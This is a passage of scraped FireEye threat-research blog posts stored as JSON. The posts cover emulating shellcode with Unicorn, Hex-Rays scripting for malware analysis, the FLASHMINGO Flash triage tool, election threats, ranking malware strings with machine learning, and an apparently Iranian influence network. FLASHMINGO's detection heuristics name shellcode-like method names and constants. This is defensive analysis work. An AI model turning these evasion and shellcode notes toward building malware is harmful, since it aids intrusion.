scdbg debug shell running with Unicorn Engine and libemu shim layer Conclusion In this article we took a quick look at the differences between the libemu and Unicorn emulators API. This allowed us to create a shim layer to import legacy libemu code and use it with Unicorn largely unchanged. Once the shim layer was in place, we next imported the libemu Win32 Environment so we could run it under Unicorn. As a final test we ported several large portions of the scdbg project, which was originally written to run under libemu. Here our previous work allowed for the importation of scdbg's 250+ API hooks and debug shell to run under Unicorn with only minimal changes. Overall the entire process went quite smoothly and should provide benefits for developers of libemu and/or Unicorn. If you would like to experiment for yourself you can download a copy of our test project here . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2018/04/solving-ad-hoc-problems-with-hex-rays-api.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2018-04-10",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction IDA Pro is the de facto standard when it comes to binary reverse engineering. Besides being a great disassembler and debugger, it is possible to extend it and include a powerful decompiler by purchasing an additional license from Hex-Rays. The ability to switch between disassembled and decompiled code can greatly reduce the analysis time. The decompiler (from now on referred to as Hex-Rays ) has been around for a long time and has achieved a good level of maturity. However, there seems to be a lack of a concise and complete resources regarding this topic (tutorials or otherwise). In this blog, we aim to close that gap by showcasing examples where scripting Hex-Rays goes a long way. Overview of a Decompiler In order to understand how the decompiler works, it’s helpful to first review the normal compilation process. Compilation and decompilation center around the concept of an Abstract Syntax Tree (AST) . In essence, a compiler takes the source code, splits it into tokens according to a grammar, then these tokens are grouped into logical expressions. In this phase of the compilation process, referred to as parsing, the code structure is represented as a complex object, the AST. From the AST, the compiler will produce assembly code for the specified platform. A decompiler takes the opposite route. From the given assembly code, it works back to produce an AST, and from this to produce pseudocode. From all the intermediate steps between code and assembly, we are stressing the AST so much because most of the time you will spend using the Hex-Rays API, you will actually be reading and/or modifying the Abstract Syntax Tree (or ctree in Hex-Rays terminology). Items, Expressions and Statements Now we know that Hex-Rays’s ctree is a tree-like data structure. The nodes of this tree are either of type cinsn_t or cexpr_t . We will define these in a moment, but for now it is important to know that both derive from a very basic type, namely the citem_t type, as seen in the following code snippet: Therefore, all nodes in the ctree will have the op property, which indicates the node type (variable, number, logical expression, etc.). The type of op (ctype_t) is an enumeration where all constants are named either cit_<xyz> (for statements) or cot_<xyz> (for expressions). Keep this in mind, as it will be very important. A quick way to inspect all ctype_t constants and their values is to execute the following code snippet: This produces the following output: Let’s dive a bit deeper and explain the two types of nodes: expressions and statements. It is useful to think about expressions as the “the little logical elements” of your code. They range from simple types such as variables, strings or numerical constants, to small code constructs (assignments, comparisons, additions, logical operations, array indexing, etc.). These are of type cexpr_t , a large structure containing several members. The members that can be accessed depend on its op value. For example, the member n to obtain the numeric value only makes sense when dealing with constants. On the other side, we have statements . These correlate roughly to language keywords (if, for, do, while, return, etc.) Most of them are related to control flow and can be thought as “the big picture elements” of your code. Recapitulating, we have seen how the decompiler exposes this tree-like structure (the ctree ), which consists of two types of nodes: expressions and statements. In order to extract information from or modify the decompiled code, we have to interact with the ctree nodes via methods dependent on the node type. However, the following question arises: “How do we reach the nodes?” This is done via a class exposed by Hex-Rays: the tree visitor ( ctree_visitor_t ). This class has two virtual methods, visit_insn and visit_expr , that are executed when a statement or expression is found while traversing the ctree. We can create our own visitor classes by inheriting from this one and overloading the corresponding methods. Example Scripts In this section, we will use the Hex-Rays API to solve two real-world problems: Identify calls to GetProcAddress to dynamically resolve Windows APIs, assigning the resulting address to a global variable. Display assignments related to stack strings as characters instead of numbers, for easier readability. GetProcAddress The first example we will walk through is how to automatically handle renaming global variables that have been dynamically resolved at run time. This is a common technique malware uses to hide its capabilities from static analysis tools. An example of dynamically resolving global variables using GetProcAddress is shown in Figure 1. Figure 1: Dynamic API resolution using GetProcAddress There are several ways to rename the global variables, with the simplest being manual copy and paste. However, this task is very repetitive and can be scripted using the Hex-Rays API. In order to write any Hex-Rays script, it is important to first visualize the ctree. The Hex-Rays SDK includes a sample, sample5, which can be used to view the current function’s ctree. The amount of data shown in a ctree for a function can be overwhelming. A modified version of the sample was used to produce a picture of a sub-ctree for the function shown in Figure 1. The sub-ctree for the single expression: 'dword_1000B2D8 = (int)GetProcAdress(v0, \"CreateThread\");' is shown in Figure 2. Figure 2: Sub-ctree for GetProcAddress assignment With knowledge of the sub-ctree in use, we can write a script to automatically rename all the global variables that are being assigned using this method. The code to automatically rename all the local variables is shown in Figure 3. The code works by traversing the ctree looking for calls to the GetProcAddress function. Once found, the code takes the name of the function being resolved and finds the global variable that is being set. The code then uses the IDA MakeName API to rename the address to the correct function. Figure 3: Function renaming global variables After the script has been executed, we can see in Figure 4 that all the global variables have been renamed to the appropriate function name. Figure 4: Global variables renamed Stack Strings Our next example is a typical issue when dealing with malware: stack strings . This is a technique aimed to make the analysis harder by using arrays of characters instead of strings in the code. An example can be seen in Figure 5; the malware stores each character’s ASCII value in the stack and then references it in the call to sprintf . At a first glance, it’s very difficult to say what is the meaning of this string (unless of course, you know the ASCII table by heart). Figure 5: Hex-Rays decompiler output. Stack strings are difficult to read. Our script will modify these assignments to something more readable. The important part of our code is the ctree visitor mentioned earlier, which is shown in Figure 6. Figure 6: Custom ctree visitor The logic implemented here is pretty straightforward. We define our subclass of a ctree visitor (line 1) and override its visit_expr method. This will only kick in when an assignment is found (line 9). Another condition to be met is that the left side of the assignment is a variable and the right side a number (line 15). Moreover, the numeric value must be in the readable ASCII range (lines 20 and 21). Once this kind of expression is found, we will change the type of the right side from a number to a string (lines 26 to 31), and replace its numerical value by the corresponding ASCII character (line 32). The modified pseudocode after running this script is shown in Figure 7. Figure 7: Assigned values shown as characters You can find the complete scripts in our FLARE GitHub repository under decompiler scripts Conclusion These two admittedly simple examples should be able to give you an idea of the power of IDA’s decompiler API. In this post we have covered the foundations of all decompiler scripts: the ctree object, a structure composed by expressions and statements representing every element of the code as well the relationships between them. By creating a custom visitor we have shown how to traverse the tree and read or modify the code elements, therefore analyzing or modifying the pseudocode. Hopefully, this post will motivate you to start writing your own scripts. This is only the beginning! Do you want to learn more about these tools and techniques from FLARE? Then you should take one of our Black Hat classes in Las Vegas this summer! Our offerings include Malware Analysis Crash Course , macOS Malware for Reverse Engineers , and Malware Analysis Master Class . References Although written in 2009, one of the best references is still the original article on the Hex-Rays blog . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/04/flashmingo-open-source-automatic-analysis-tool-for-flash.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-04-15",
                    "source": "www.fireeye.com"
                },
                "text": "Adobe Flash is one of the most exploited software components of the last decade. Its complexity and ubiquity make it an obvious target for attackers. Public sources list more than one thousand CVEs being assigned to the Flash Player alone since 2005. Almost nine hundred of these vulnerabilities have a Common Vulnerability Scoring System (CVSS) score of nine or higher. After more than a decade of playing cat and mouse with the attackers, Adobe is finally deprecating Flash in 2020. To the security community this move is not a surprise since all major browsers have already dropped support for Flash. A common misconception exists that Flash is already a thing of the past; however, history has shown us that legacy technologies linger for quite a long time. If organizations do not phase Flash out in time, the security threat may grow beyond Flash's end of life due to a lack of security patches. As malware analysts on the FLARE team, we still see Flash exploits within malware samples. We must find a compromise between the need to analyse Flash samples and the correct amount of resources to be spent on a declining product. To this end we developed FLASHMINGO , a framework to automate the analysis of SWF files. FLASHMINGO enables analysts to triage suspicious Flash samples and investigate them further with minimal effort. It integrates into various analysis workflows as a stand-alone application or can be used as a powerful library. Users can easily extend the tool's functionality via custom Python plug-ins. Background: SWF and ActionScript3 Before we dive into the inner workings of FLASHMINGO, let’s learn about the Flash architecture. Flash’s SWF files are composed of chunks, called tags , implementing a specific functionality. Tags are completely independent from each other, allowing for compatibility with older versions of Flash. If a tag is not supported, the software simply ignores it. The main source of security issues revolves around SWF’s scripting language: ActionScript3 (AS3). This scripting language is compiled into bytecode and placed within a Do ActionScript ByteCode ( DoABC ) tag. If a SWF file contains a DoABC tag, the bytecode is extracted and executed by a proprietary stack-based virtual machine (VM), known as AVM2 in the case of AS3, shipped within Adobe’s Flash player. The design of the AVM2 was based on the Java VM and was similarly plagued by memory corruption and logical issues that allowed malicious AS3 bytecode to execute native code in the context of the Flash player. In the few cases where the root cause of past vulnerabilities was not in the AVM2, ActionScript code was still necessary to put the system in a state suitable for reliable exploitation. For example, by grooming the heap before triggering a memory corruption. For these reasons, FLASHMINGO focuses on the analysis of AS3 bytecode. Tool Architecture FLASHMINGO leverages the open source SWIFFAS library to do the heavy lifting of parsing Flash files. All binary data and bytecode are parsed and stored in a large object named SWFObject . This object contains all the information about the SWF relevant to our analysis: a list of tags, information about all methods, strings, constants and embedded binary data, to name a few. It is essentially a representation of the SWF file in an easily queryable format. FLASHMINGO is a collection of plug-ins that operate on the SWFObject and extract interesting information. Figure 1 shows the relationship between FLASHMINGO, its plug-ins, and the SWFObject . Figure 1: High level software structure Several useful plug-ins covering a wide range of common analysis are already included with FLASHMINGO, including: Find suspicious method names. Many samples contain method names used during development, like “run_shell” or “find_virtualprotect”. This plug-in flags samples with methods containing suspicious substrings. Find suspicious constants. The presence of certain constant values in the bytecode may point to malicious or suspicious code. For example, code containing the constant value 0x5A4D may be shellcode searching for an MZ header. Find suspicious loops. Malicious activity often happens within loops. This includes encoding, decoding, and heap spraying. This plug-in flags methods containing loops with interesting operations such as XOR or bitwise AND. It is a simple heuristic that effectively detects most encoding and decoding operations, and otherwise interesting code to further analyse. Retrieve all embedded binary data. A decompiler plug-in that uses the FFDEC Flash Decompiler . This decompiler engine, written in Java, can be used as a stand-alone library. Since FLASHMINGO is written in Python, using this plug-in requires Jython to interoperate between these two languages. Extending FLASHMINGO With Your Own Plug-ins FLASHMINGO is very easy to extend. Every plug-in is located in its own directory under the plug-ins directory. At start-up FLASHMINGO searches all plug-in directories for a manifest file (explained later in the post) and registers the plug-in if it is marked as active. To accelerate development a template plug-in is provided. To add your own plug-in, copy the template directory, rename it, and edit its manifest and code. The template plug-in’s manifest, written in YAML, is shown below: ``` # This is a template for easy development name : Template active : no description : copy this to kickstart development returns : nothing ``` The most important parameters in this file are: name and active . The name parameter is used internally by FLASHMINGO to refer to it. The active parameter is a Boolean value (yes or no) indicating whether this plug-in should be active or not. By default, all plug-ins (except the template) are active, but there may be cases where a user would want to deactivate a plug-in. The parameters description and returns are simple strings to display documentation to the user. Finally, plug-in manifests are parsed once at program start. Adding new plug-ins or enabling/disabling plug-ins requires restarting FLASHMINGO. Now for the actual code implementing the business logic. The file plugin.py contains a class named Plugin ; the only thing that is needed is to implement its run method. Each plug-in receives an instance of a SWFObject as a parameter. The code will interact with this object and return data in a custom format, defined by the user. This way, the user's plug-ins can be written to produce data that can be directly ingested by their infrastructure. Let's see how easy it is to create plug-ins by walking through one that is included, named binary_data . This plugin returns all embedded data in a SWF file by default. If the user specifies an optional parameter pattern then the plug-in searches for matches of that byte sequence within the embedded data, returning a dictionary of embedded data and the offset at which the pattern was found. First, we define the optional argument pattern to be supplied by the user (line 2 and line 4): Afterwards, implement a custom run method and all other code needed to support it: This is a simple but useful plugin and illustrates how to interact with FLASHMINGO. The plug-in has a logging facility accessible through the property “ml” (line 2). By default it logs to FLASHMINGO’s main logger. If unspecified, it falls back to a log file within the plug-in’s directory. Line 10 to line 16 show the custom run method, extracting information from the SWF’s embedded data with the help of the custom _inspect_binary_data method. Note the source of this binary data: it is being read from a property named “swf”. This is the SWFObject passed to the plug-in as an argument, as mentioned previously. More complex analysis can be performed on the SWF file contents interacting with this swf object. Our repository contains documentation for all available methods of a SWFObject . Conclusion Even though Flash is set to reach its end of life at the end of 2020 and most of the development community has moved away from it a long time ago, we predict that we’ll see Flash being used as an infection vector for a while. Legacy technologies are juicy targets for attackers due to the lack of security updates. FLASHMINGO provides malware analysts a flexible framework to quickly deal with these pesky Flash samples without getting bogged down in the intricacies of the execution environment and file format. Find the FLASHMINGO tool on the FireEye public GitHub Repository . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/05/framing-the-problem-cyber-threats-and-elections.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-05-30",
                    "source": "www.fireeye.com"
                },
                "text": "This year, Canada, multiple European nations, and others will host high profile elections. The topic of cyber-enabled threats disrupting and targeting elections has become an increasing area of awareness for governments and citizens globally. To develop solutions and security programs to counter cyber threats to elections, it is important to begin with properly categorizing the threat. In this post, we’ll explore the various threats to elections FireEye has observed and provide a framework for organizations to sort these activities. The Election Ecosystem: Targets Historically, FireEye has observed targeting of a wide range of organizations connected to elections. In considering their role and criticality to the process of elections, these various entities can be grouped into three categories: core election infrastructure, supporting organizations involved in the administration of elections, and other groups that have a participatory role in the electoral process. All of these entities may be targeted for a variety of reasons to influence or collect intelligence on the electoral process and participants. FireEye is aware of only limited indications of entities targeted in the first category (light blue area). Although we have not observed direct evidence that actors have manipulated the electoral process in any major national or regional election by infiltrating the systems or hardware used to record or tally votes, the sheer complexity of these systems prevents us from categorically stating that these systems have not been successfully compromised. Moving outward into the gray section of the diagram, entities that fall into this category include organizations involved in the administration of elections. While these organizations may maintain networks separate from voting systems and tabulation platforms, they play important roles in overseeing and communicating results to the public. FireEye has witnessed breaches into a variety of these organizations, in some cases for the purpose of collecting intelligence or in others to coopt and display false information on publicly-facing systems as part of an influence campaign. Lastly, FireEye has observed targeting of organizations that are involved in election campaigns and news coverage. Tactics we have witnessed include disinformation campaigns on adversary-maintained infrastructure and social media platforms. For example, in August 2017, we observed several inauthentic news websites created to mimic legitimate local and international media organizations ahead of a sub-Saharan African nation’s presidential election. A subset of the counterfeit domains appears to have been created in coordination with each other, if not by the same actor, to damage the reputation of the presidential nominee for the opposition party. The Threat Activity To counter and mitigate risks to elections, properly categorizing the specific activity and intent is important. While terms like “election interference” are often used to describe all of the threats in this space, some of the malicious activity FireEye has witnessed may fall outside this definition. Broadly speaking most election-related threats can be thought of in four categories: social-media enabled disinformation, cyber espionage, “hack and leak” campaigns, and attacks on critical election infrastructure. Social-Media Enabled Disinformation : This category includes the activity FireEye has tracked from the Russia-affiliated Internet Research Association (IRA) and various Iranian disinformation operations . In some cases, this has involved creating fraudulent content on controversial issues and seeking to promote it across social media platforms. In other examples, disinformation campaigns have focused on amplifying already issues that have organic interest. Some of these campaigns may also be involved in politically-motivated messaging on social media platforms prior to elections without a specific focus electoral events. Cyber Espionage : Nation state actors like Russia-nexus APT28 and Sandworm Team, and China-nexus APT40, have carried out cyber espionage operations against multiple types of targets in the election ecosystem. This has ranged from intrusions into everything from political campaigns to election commissions, likely for a variety of reasons. In some cases, these actors are possibly seeking to obtain information on policy stances of candidates and political parties. In other situations—particularly against election administrators or system vendors—it is possible that these intrusions are reconnaissance for further operations, seeking to understand network layouts that may allow them to move into more critical infrastructure. “Hack and Leak” Campaigns : Some threat actors that FireEye has observed have utilized the data they’ve gained from espionage intrusions to then leak that information with the intent of influencing public perception. In this manner, they combine the previous two categories of activity. Notably, this tactic has been employed by Guccifer 2.0 and DC Leaks in the 2016 U.S. election. In some cases, similar tactics have leveraged compromised infrastructure to carry out disinformation operations, such as in the 2014 Ukrainian presidential campaign in which Russian-nexus actors posted erroneous election results from the compromised Ukrainian election commission website. Attacks on Critical Election Infrastructure : Compromises into core critical infrastructure such as election management systems, voting systems, electronic pollbooks, and others represent the most critical risks to elections, with the potential to alter or delete votes or voters from voter rolls. Though this is an often-discussed risk, there is limited evidence of intrusion activity targeting core election infrastructure. Of the activity described here, FireEye has observed a full spectrum of campaigns by Russian-nexus actors, from carrying out intrusions into organizations and stealing data, leaking that data through online personas and fronts, as well as targeting of election infrastructure. From limited observations, China has for the most part focused solely on cyber espionage operations, as in the case of activity FireEye reported on in the targeting the 2018 Cambodian election . From various motivations, FireEye has also witnessed limited evidence of activity from hacktivists and criminal entities in targeting parts of the election ecosystem. Conclusion While there is increasing global awareness of threats to elections, election administrators and others continue to face challenges in ensuring the integrity of the vote. To properly counter threats to elections, individuals and organizations involved in the electoral process should: Learn the Playbook of the Adversary : Proactive organizations can learn from the activity of threat actors uncovered in other elections and implement security controls that adapt to new tools and TTPs. Political campaigns and others should also educate staff and contractors on common spear-phishing tactics used by some of the primary APT groups. Incorporate Threat Intelligence for Context : Operationally, security organizations can utilize threat intelligence to better differentiate and triage the most important alerts from untargeted commodity malware activity. Anticipate External Threats : Beyond the internal networks of county governments and political campaigns, election administrators and risk management professionals involved in elections should prepare plans for dealing with leaked and compromised data, understanding how threat actors may utilize this for disinformation campaigns. I will be speaking about cyber threats and elections during FireEye Virtual Summit , so register today to learn more. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/05/learning-to-rank-strings-output-for-speedier-malware-analysis.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-05-29",
                    "source": "www.fireeye.com"
                },
                "text": "Reverse engineers, forensic investigators, and incident responders have an arsenal of tools at their disposal to dissect malicious software binaries. When performing malware analysis, they successively apply these tools in order to gradually gather clues about a binary’s function, design detection methods, and ascertain how to contain its damage. One of the most useful initial steps is to inspect its printable characters via the Strings program . A binary will often contain strings if it performs operations like printing an error message, connecting to a URL, creating a registry key, or copying a file to a specific location – each of which provide crucial hints that can help drive future analysis. Manually filtering out these relevant strings can be time consuming and error prone, especially considering that: Relevant strings occur disproportionately less often than irrelevant strings. Larger binaries can output upwards of tens of thousands of individual strings. The definition of \"relevant” can vary significantly across individual human analysts. Investigators would never want to miss an important clue that could have reduced their time spent performing the malware analysis, or even worse, led them to draw incomplete or incorrect conclusions. In this blog post, we will demonstrate how the FireEye Data Science (FDS) and FireEye Labs Reverse Engineering (FLARE) teams recently collaborated to streamline this analyst pain point using machine learning. Highlights Running the Strings program on a piece of malware inevitably produces noisy strings mixed in with important ones, which can only be uncovered after sifting and scrolling through the entirety of its messy output. FireEye’s new machine learning model that automatically ranks strings based on their relevance for malware analysis speeds up this process at scale. Knowing which individual strings are relevant often requires highly experienced analysts. Quality, security-relevant labeled training data can be time consuming and expensive to obtain, but weak supervision that leverages the domain expertise of reverse engineers helps accelerate this bottleneck. Our proposed learning-to-rank model can efficiently prioritize Strings outputs from individual malware samples. On a dataset of relevant strings from over 7 years of malware reports authored by FireEye reverse engineers, it also performs well based on criteria commonly used to evaluate recommendation and search engines. Background Each string returned by the Strings program is represented by sequences of 3 characters or more ending with a null terminator, independent of any surrounding context and file formatting. These loose criteria mean that Strings may identify sequences of characters as strings when they are not human-interpretable. For example, if consecutive bytes 0x31, 0x33, 0x33, 0x37, 0x00 appear within a binary, Strings will interpret this as “1337.” However, those ASCII characters may not actually represent that string per se; they could instead represent a memory address, CPU instructions, or even data utilized by the program. Strings leaves it up to the analyst to filter out such irrelevant strings that appear within its output. For instance, only a handful of the strings listed in Figure 1 that originate from an example malicious binary are relevant from a malware analyst’s point of view. Figure 1: An example Strings output containing 44 strings for a toy sample with a SHA-256 value of eb84360ca4e33b8bb60df47ab5ce962501ef3420bc7aab90655fd507d2ffcedd . Ranking strings in terms of descending relevance would make an analyst’s life much easier. They would then only need to focus their attention on the most relevant strings located towards the top of the list, and simply disregard everything below. However, solving the task of automatically ranking strings is not trivial. The space of relevant strings is unstructured and vast, and devising finely tuned rules to robustly account for all the possible variations among them would be a tall order. Learning to Rank Strings Output This task can instead be formulated in a machine learning (ML) framework called learning to rank (LTR) , which has been historically applied to problems like information retrieval, machine translation, web search, and collaborative filtering. One way to tackle LTR problems is by using Gradient Boosted Decision Trees (GBDTs) . GBDTs successively learn individual decision trees that reduce the loss using a gradient descent procedure, and ultimately use a weighted sum of every trees’ prediction as an ensemble. GBDTs with an LTR objective function can learn class probabilities to compute each string’s expected relevance, which can then be used to rank a given Strings output. We provide a high-level overview of how this works in Figure 2. In the initial train() step of Figure 2, over 25 thousand binaries are run through the Strings program to generate training data consisting of over 18 million total strings . Each training sample then corresponds to the concatenated list of ASCII and Unicode strings output by the Strings program on that input file. To train the model, these raw strings are transformed into numerical vectors containing natural language processing features like Shannon entropy and character co-occurrence frequencies, together with domain-specific signals like the presence of indicators of compromise (e.g. file paths, IP addresses, URLs, etc.), format strings, imports, and other relevant landmarks. Figure 2: The ML-based LTR framework ranks strings based on their relevance for malware analysis. This figure illustrates different steps of the machine learning modeling process: the initial train() step is denoted by solid arrows and boxes, and the subsequent predict() and sort() steps are denoted by dotted arrows and boxes. Each transformed string’s feature vector is associated with a non-negative integer label that represents their relevance for malware analysis. Labels range from 0 to 7, with higher numbers indicating increased relevance. To generate these labels, we leverage the subject matter knowledge of FLARE analysts to apply heuristics and impose high-level constraints on the resulting label distributions. While this weak supervision approach may generate noise and spurious errors compared to an ideal case where every string is manually labeled, it also provides an inexpensive and model-agnostic way to integrate domain expertise directly into our GBDT model. Next during the predict() step of Figure 2, we use the trained GBDT model to predict ranks for the strings belonging to an input file that was not originally part of the training data, and in this example query we use the Strings output shown in Figure 1. The model predicts ranks for each string in the query as floating-point numbers that represent expected relevance scores, and in the final sort() step of Figure 2, strings are sorted in descending order by these scores. Figure 3 illustrates how this resulting prediction achieves the desired goal of ranking strings according to their relevance for malware analysis. Figure 3: The resulting ranking on the strings depicted in both Figure 1 and in the truncated query of Figure 2. Contrast the relative ordering of the strings shown here to those otherwise identical lists. The predicted and sorted string rankings in Figure 3 show network-based indicators on top of the list, followed by registry paths and entries. These reveal the potential C2 server and malicious behavior on the host. The subsequent output consisting of user-related information is more likely to be benign, but still worthy of investigation. Rounding out the list are common strings like Windows API functions and PE artifacts that tend to raise no red flags for the malware analyst. Quantitative Evaluation While it seems like the model qualitatively ranks the above strings as expected, we would like some quantitative way to assess the model’s performance more holistically. What evaluation criteria can we use to convince ourselves that the model generalizes beyond the coverage of our weak supervision sources, and to compare models that are trained with different parameters? We turn to the recommender systems literature, which uses the Normalized Discounted Cumulative Gain (NDCG) score to evaluate ranking of items (i.e. individual strings) in a collection (i.e. a Strings output). NDCG sounds complicated, but let’s boil it down one letter at a time: “G” is for gain, which corresponds to the magnitude of each string’s relevance. “C” is for cumulative, which refers to the cumulative gain or summed total of every string’s relevance. “D” is for discounted, which divides each string’s predicted relevance by a monotonically increasing function like the logarithm of its ranked position, reflecting the goal of having the most relevant strings ranked towards the top of our predictions. “N” is for normalized, which means dividing DCG scores by ideal DCG scores calculated for a ground truth holdout dataset, which we obtain from FLARE-identified relevant strings contained within historical malware reports. Normalization makes it possible to compare scores across samples since the number of strings within different Strings outputs can vary widely. Figure 4: Kernel Density Estimate of NDCG@100 scores for Strings outputs from the holdout dataset. Scores are calculated for the original ordering after simply running the Strings program on each binary (gray) versus the predicted ordering from the trained GBDT model (red). In practice, we take the first k strings indexed by their ranks within a single Strings output, where the k parameter is chosen based on how many strings a malware analyst will attend to or deem relevant on average. For our purposes we set k = 100 based on the approximate average number of relevant strings per Strings output. NDCG@ k scores are bounded between 0 and 1, with scores closer to 1 indicating better prediction quality in which more relevant strings surface towards the top. This measurement allows us to evaluate the predictions from a given model versus those generated by other models and ranked with different algorithms. To quantitatively assess model performance, we run the strings from each sample that have ground truth FLARE reports though the predict() step of Figure 2, and compare their predicted ranks with a baseline of the original ranking of strings output by Strings . The divergence in distributions of NDCG@100 scores between these two approaches demonstrates that the trained GBDT model learns a useful structure that generalizes well to the independent holdout set (Figure 4). Conclusion In this blog post, we introduced an ML model that learns to rank strings based on their relevance for malware analysis. Our results illustrate that it can rank Strings output based both on qualitative inspection (Figure 3) and quantitative evaluation of NDCG@ k (Figure 4). Since Strings is so commonly applied during malware analysis at FireEye and elsewhere, this model could significantly reduce the overall time required to investigate suspected malicious binaries at scale. We plan on continuing to improve its NDCG@ k scores by training it with more high fidelity labeled data, incorporating more sophisticated modeling and featurization techniques, and soliciting further analyst feedback from field testing. It’s well known that malware authors go through great lengths to conceal useful strings from analysts, and a potential blind spot to consider for this model is that the utility of Strings itself can be thwarted by obfuscation. However, open source tools like the FireEye Labs Obfuscated Strings Solver (FLOSS) can be used as an in-line replacement for Strings . FLOSS automatically extracts printable strings just as Strings does, but additionally reveals obfuscated strings that have been encoded, packed, or manually constructed on the stack. The model can be readily trained on FLOSS outputs to rank even obfuscated strings. Furthermore, since it can be applied to arbitrary lists of strings, the model could also be used to rank strings extracted from live memory dumps and sandbox runs. This work represents a collaboration between the FDS and FLARE teams, which together build predictive models to help find evil and improve outcomes for FireEye’s customers and products . If you are interested in this mission, please consider joining the team by applying to one of our job openings . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/05/social-media-network-impersonates-us-political-candidates-supports-iranian-interests.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-05-28",
                    "source": "www.fireeye.com"
                },
                "text": "In August 2018, FireEye Threat Intelligence released a report exposing what we assessed to be an Iranian influence operation leveraging networks of inauthentic news sites and social media accounts aimed at audiences around the world. We identified inauthentic social media accounts posing as everyday Americans that were used to promote content from inauthentic news sites such as Liberty Front Press (LFP), US Journal, and Real Progressive Front. We also noted a then-recent shift in branding for some accounts that had previously self-affiliated with LFP; in July 2018, the accounts dropped their LFP branding and adopted personas aligned with progressive political movements in the U.S. Since then, we have continued to investigate and report on the operation to our intelligence customers, detailing the activity of dozens of additional sites and hundreds of additional social media accounts. Recently, we investigated a network of English-language social media accounts that engaged in inauthentic behavior and misrepresentation and that we assess with low confidence was organized in support of Iranian political interests. In addition to utilizing fake American personas that espoused both progressive and conservative political stances, some accounts impersonated real American individuals, including a handful of Republican political candidates that ran for House of Representatives seats in 2018. Personas in this network have also had material published in U.S. and Israeli media outlets, attempted to lobby journalists to cover specific topics, and appear to have orchestrated audio and video interviews with U.S. and UK-based individuals on political issues. While we have not at this time tied these accounts to the broader influence operation we identified last year, they promoted material in line with Iranian political interests in a manner similar to accounts that we have previously assessed to be of Iranian origin. Most of the accounts in the network appear to have been suspended on or around the evening of 9 May, 2019. Appendix 1 provides a sample of accounts in the network. The Network The accounts, most of which were created between April 2018 and March 2019, used profile pictures appropriated from various online sources, including, but not limited to, photographs of individuals on social media with the same first names as the personas. As with some of the accounts that we identified to be of Iranian origin last August, some of these new accounts self-described as activists, correspondents, or “free journalist[s]” in their user descriptions. Some accounts posing as journalists claimed to belong to specific news organizations, although we have been unable to identify individuals belonging to those news organizations with those names. Narratives promoted by these and other accounts in the network included anti-Saudi, anti-Israeli, and pro-Palestinian themes. Accounts expressed support for the Joint Comprehensive Plan of Action (JCPOA), commonly known as the Iran nuclear deal; opposition to the Trump administration’s designation of Iran’s Islamic Revolutionary Guard Corps (IRGC) as a Foreign Terrorist Organization; antipathy toward the Ministerial to Promote a Future of Peace and Security in the Middle East (a U.S.-led conference that focused on Iranian influence in the Middle East more commonly known as the February 2019 Warsaw Summit); and condemnation of U.S. President Trump’s veto of a resolution passed by Congress to end U.S. involvement in the Yemen conflict. Figure 1: Sample tweets on the Trump administration’s designation of Iran’s IRGC as a Foreign Terrorist Organization Interestingly, some accounts in the network also posted a small amount of messaging seemingly contradictory to their otherwise pro-Iran stances. For example, while one account’s tweets were almost entirely in line with Iranian political interests, including a tweet claiming that “iran has shown us that his nuclear program is peaceful [sic],” the account also posted a series of tweets directed at U.S. President Trump on Sept. 25, 2018, the same day that he gave a speech to the United Nations in which he excoriated the Iranian Government. The account called on Trump to attack Iran, using the hashtags #attack_Iran, #go_to_hell_Rouhani, #stop_sanctions, #UnitedNations, and #trump_speech; other accounts in the network, which likewise predominantly held pro-Iran stances, echoed these sentiments, using the same or similar hashtags. It is possible that these accounts were seeking to build an audience with views antipathetic to Iran that could then later be targeted with pro-Iranian messaging. Apart from the narratives and messaging promoted, we observed several limited indicators that the network was operated by Iranian actors. For example, one account in the network, @AlexRyanNY, created in 2010, had only two visible tweets prior to 2017, one of which, from 2011, was in Persian and of a personal nature. Subsequently in 2017, @AlexRyanNY claimed in a tweet to be “an Iranian who supported Hillary” in a tweet directed at a Democratic political strategist. This account, using the display name “Alex Ryan” and claiming to be a Newsday correspondent, appropriated the photograph of a genuine individual also with the first name of Alex. We note that it is possible that the account was compromised from another individual or that it was merely repurposed by the same actor. Additionally, while most of the accounts in the network had their interface languages set to English, we observed that one account had its interface language set to Persian. Impersonation of U.S. Political Candidates Some Twitter accounts in the network impersonated Republican political candidates that ran for House of Representatives seats in the 2018 U.S. congressional midterms. These accounts appropriated the candidates’ photographs and, in some cases, plagiarized tweets from the real individuals’ accounts. Aside from impersonating real U.S. political candidates, the behavior and activity of these accounts resembled that of the others in the network. For example, the account @livengood_marla impersonated Marla Livengood, a 2018 candidate for California’s 9 th Congressional District, using a photograph of Livengood and a campaign banner for its profile and background pictures. The account began tweeting on Sept. 24, 2018, with its first tweet plagiarizing one from Livengood’s official account earlier that month: Figure 2: Tweet by suspect account @livengood_marla, dated Sept. 24, 2018 (left); tweet by Livengood’s verified account, dated Sept. 1, 2018 (right) The @livengood_marla account plagiarized a number of other tweets from Livengood’s official account, including some that referenced Livengood’s official account username: Figure 3: Tweet by suspect account @livengood_marla, dated Sept. 24, 2018 (left); tweet by Livengood’s verified account, dated Sept. 3, 2018 (right) The @livengood_marla account also tweeted various news snippets on both political and apolitical subjects, such as the confirmation of Brett Kavanaugh to the U.S. Supreme Court and the wedding of the UK’s Princess Eugenie and Jack Brooksbank, prior to segueing into promoting material more closely aligned with Iranian interests. For example, the account, along with others in the network, commemorated the United Nations’ International Day of the Girl Child with a photograph of emaciated children in Yemen, as well as narratives pertaining to the killing of Saudi journalist Jamal Khashoggi and Saudi Shiite child Zakaria al-Jaber, intended to portray Saudi Arabia in a negative light. In another example, the account @ButlerJineea impersonated Jineea Butler, a 2018 candidate for New York’s 13 th Congressional 